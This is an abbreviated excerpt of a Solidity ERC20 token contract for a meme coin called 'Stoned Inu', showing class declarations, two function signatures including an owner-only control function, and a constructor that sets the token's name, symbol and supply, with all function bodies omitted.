...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _MakeInuWeedy(address account, uint256 amount) internal {
    ...
    function _lightTheJoint(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
...
contract ERC20StonedInu is Context, ERC20 {
    constructor(
...
contract StonedInu is ERC20StonedInu {
    constructor() ERC20StonedInu("Stoned Inu", "stonedINU", false, true, 1000, 30, msg.sender, 420000 * 10 ** 18, msg.sender, 5) {
    }
}